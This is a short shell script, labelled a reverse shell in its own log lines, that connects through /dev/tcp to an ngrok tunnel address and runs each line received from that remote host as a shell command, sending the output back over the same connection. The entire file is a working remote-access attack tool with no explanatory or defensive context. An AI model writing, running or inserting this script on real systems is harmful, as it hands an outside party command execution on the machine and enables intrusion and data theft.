#!/bin/sh
echo "[*] Start reverse shell" > /tmp/revshell.log
exec 5<>/dev/tcp/0.tcp.ngrok.io/18035 || echo "TCP connect failed" >> /tmp/revshell.log
echo "[*] TCP opened" >> /tmp/revshell.log
cat <&5 | while read line; do $line 2>&5 >&5; done


